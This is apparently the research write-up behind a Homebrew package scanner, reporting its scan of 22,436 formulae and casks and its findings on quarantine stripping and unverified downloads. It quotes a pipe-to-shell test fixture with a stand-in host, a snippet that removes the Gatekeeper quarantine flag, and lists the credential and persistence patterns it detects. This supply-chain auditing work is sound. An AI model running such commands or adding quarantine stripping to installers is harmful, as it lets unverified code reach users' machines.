# What we found scanning 22,436 Homebrew formulae and casks

This is the research behind `homebrew-audit`: a real scan of homebrew-core, homebrew-cask and
the most-starred third-party taps, run with this exact engine. It was calibrated until a "clean"
result could be trusted, and only then were results reported.

## Method

| Corpus | Taps | Files | Formulae | Casks |
| --- | --- | --- | --- | --- |
| Homebrew/homebrew-core (HEAD, 2026-11-24) | 1 | 8,742 | 8,742 | 0 |
| Homebrew/homebrew-cask (HEAD, 2026-11-24) | 1 | 7,851 | 0 | 7,851 |
| Top third-party taps by GitHub stars (`homebrew-*` repos outside the Homebrew org) | 139 | 5,843 | 4,232 | 1,611 |
| **Total** | **141** | **22,436** | **12,974** | **9,462** |

The top 160 repositories matching `homebrew-*` / `homebrew-tap` (outside the Homebrew org) were
fetched as tarballs. 139 of them contained formula or cask Ruby under `Formula/`, `Casks/`,
`HomebrewFormula/` or the repo root. Every file was scanned statically.

The official repositories served as the **reference set**: they are reviewed by maintainers and
CI, so a HIGH or CRITICAL finding there is either a false positive or a genuine, accepted
weakness. The engine was tuned until every remaining official HIGH was the second kind.

## Headline

| Result | homebrew-core | homebrew-cask | Third-party taps |
| --- | --- | --- | --- |
| Scanned | 8,742 | 7,851 | 5,843 |
| CRITICAL | 0 | 0 | **651** (11.1%) |
| HIGH | 0 | 6 (0.08%) | 14 |
| MEDIUM | 0 | 0 | 22 |
| LOW (`http://`, still sha256-pinned) | 12 | 7 | 242 |
| **Clean** | **99.86%** | **99.83%** | 84.1% |
| Taps with ≥1 HIGH/CRITICAL | 0 | 1 | **7 of 139** |

**The official repositories are clean.** Over 16,593 reviewed packages there are zero CRITICAL
findings. The 6 HIGH findings are all the same genuine weakness: an `http://` download with
`sha256 :no_check`, so nothing verifies the bytes and anyone on the network path can swap them.

**Third-party taps are a different trust model.** They're also mostly clean, but almost every
real finding there is a deliberate security bypass, not malware.

## The noise: what looks dangerous in Homebrew Ruby but isn't

A context-blind pass (the same regexes, every line scored) flagged **407 official packages
(2.45%)**, 197 of them HIGH or CRITICAL. Every one was a false positive or advice text:

| Signal (naive) | Official files | Why it's noise |
| --- | --- | --- |
| Credential paths (`~/.aws`, `~/.ssh`, keychains) | 180 casks | Listed in `zap trash:`, where they are being **deleted** on uninstall |
| `curl` / network fetch at install | 131 formulae | Nearly all inside `test do`, testing the formula's own networking |
| `eval` / `instance_eval` | 52 | Shell `$(eval …)` in Makefiles, Perl `eval {}` in patches and heredocs |
| `sudo` | 18 | Outside install code: `caveats` telling the user what to run, and tests |
| launchd install / `~/.zshrc` writes | 13 | `caveats` advice, or `service do` (Homebrew's own supported mechanism) |
| Pipe-to-shell | 1 | A security tool's `test do` fixture: `curl https://x.invalid/i.sh \| sh` |
| TCC.db write | 1 | The word "TCC.db" in a `desc` line |

The fix is structural, not a matter of weaker regexes. Every line gets the context of the stanza
it lives in, found by indentation and heredoc tracking: `def install` / `post_install` /
`preflight` / `postflight` / `postflight_steps`, `uninstall*` / `zap`, `test do`, `livecheck`,
`caveats`, or metadata. Destructive patterns only score in code that runs at install time.
Removal stanzas can delete launchd plists and sudoers files without it counting. `caveats` are
capped at MEDIUM. **2.45% → 0.04%**, with every one of the 12 canaries in `tests/` still tripping
at full severity.

## What was actually worth flagging (third-party taps)

All patterns are stated anonymously and as *observed behavior*, not verdicts. Intent is the
maintainer's to explain.

### 1. Quarantine stripping: 651 casks in install hooks, 6 taps

```ruby
postflight_steps do
  run "/usr/bin/xattr", args: ["-r", "-d", "com.apple.quarantine", "{{staged_path}}"]
end
```

Removing `com.apple.quarantine` means Gatekeeper never runs its signature/notarization check on
first launch. homebrew-cask does this **zero** times. When a cask's app is unsigned, the official
cask still installs it, and macOS asks the user. In third-party taps:

- 6 of the 31 cask-carrying taps strip quarantine (19%).
- One popular tap does it in **631 of its 634 casks (99.5%)**, as a blanket install policy.
  Tapping it opts every cask you install from it out of Gatekeeper, silently.
- Outside that tap, 20 more casks strip it in an install hook, and 15 tell the user to do it
  themselves in `caveats`.

This is the Homebrew-specific attack surface. A tap that strips quarantine hasn't done anything
malicious yet, but it has removed the one OS control that would catch it if a release were ever
swapped.

### 2. Unverified plaintext downloads: 14 files, 3 taps (plus 6 official casks)

`url "http://…"` together with `sha256 :no_check`, or with no checksum at all. Anyone on the
network path can serve different bytes and nothing will notice. Another 244 tap files (26 taps)
download over `http://` but are sha256-pinned. Those are scored LOW, because the checksum still
holds.

### 3. Install-time fetches that bypass `url`/`resource`: 3 formulae

Downloads inside `def install` skip Homebrew's checksum. One formula queries a third-party IP
geolocation API during install to pick a download mirror. That's probably benign, but it's an
undisclosed network call carrying the user's IP, from inside an install script. One fetches a
release index from a CDN at install time, and one populates a candidate list from a vendor API.

### 4. Advice that weakens the machine: 16 caveats

One caveat tells the user to pipe a remote script into `sh`, and 15 tell them to strip
quarantine by hand. These are capped at MEDIUM, because a human still decides. They are still
worth knowing about before you follow them.

### 5. Missing checksums and world-writable paths

2 formulae download a moving `master.zip` / unpinned archive with no checksum. 2 make an
installed log path `chmod 0777`.

### Not found

Across all 22,436 files, the corpus contained **zero** instances of credential exfiltration,
keychain dumping, decoded-then-executed payloads, remote Ruby eval, Gatekeeper/SIP disabling,
sudoers/TCC/`authorized_keys` writes, launchd persistence planted from a hook, or shell-rc
tampering in executable code. That's worth stating plainly, because the incentive in security
marketing runs the other way. The scanner does catch all of these, as the canaries show.

## Ecosystem posture (informational, not scored)

| Signal | homebrew-cask | Third-party casks |
| --- | --- | --- |
| `sha256 :no_check` (unpinned, auto-updating download) | **2,780 (35.4%)** | 69 (4.3%) |
| Runs a `.pkg` installer | 754 (9.6%) | 255 (15.8%) |
| Install hook (`preflight` / `postflight` / `*_steps`) | 121 (1.5%) | 725 (45.0%) |
| `sudo: true` privileged command | 102 (1.3%) | 20 (1.2%) |

**More than a third of official casks are not pinned to a hash.** For a moving "latest" URL
that's a deliberate trade-off: the app updates itself anyway, so the cask points at the vendor's
current build. It also means that for those casks, TLS plus the vendor's code signature (checked
by Gatekeeper on first launch) is the only integrity check. That is exactly why quarantine
stripping matters: in a cask with `:no_check` and stripped quarantine, nothing at all verifies
the binary.

## Takeaways

1. **Scan a tap before you `brew tap` it.** `brew secaudit owner/tap` takes one tarball fetch.
2. **Treat quarantine stripping as a policy you are opting into**, not an install detail.
3. **Classify by stanza or drown in noise.** `zap`, `test do` and `caveats` are where all the
   scary strings live in reviewed code.
4. **`:no_check` + `http://` is the one official weakness**, and it is cheap to fix upstream.

---

Reproduce: `python3 homebrew_audit.py --tap owner/homebrew-xxx`, or point it at a checkout of
homebrew-core / homebrew-cask.

*Findings are pattern matches warranting human review. Confirmed malicious packages should be
reported responsibly to the tap maintainer or Homebrew, never published as unverified
accusations.*
